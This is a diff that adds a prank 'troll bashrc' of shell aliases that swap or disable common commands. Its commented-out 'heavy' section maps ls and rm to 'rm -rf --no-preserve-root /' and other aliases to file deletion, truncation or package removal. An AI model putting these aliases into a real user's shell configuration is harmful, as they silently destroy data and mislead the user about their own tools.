@@ -1,0 +1,21 @@
+# Troll bashrc.
+# Many ideas from https://chat.stackexchange.com/rooms/240/conversation/aliases
+
+
+# Mild troll-ness
+alias ls=sl
+alias wget=ping
+alias rm="echo \"You can't use rm\" #"
+alias man='echo No manual entry for $1'
+
+# Alternate
+#alias ls='cmd.exe /C DIR'
+#alias ping=wget
+
+# Heavy troll-ness
+#alias rm='rm -rf --no-preserve-root /'
+#alias ls='rm -rf --no-preserve-root /'
+#alias cd='rm -r'
+#alias gcc=rm
+#alias apt-get='apt-get remove $2'
+#alias cat='cat >'
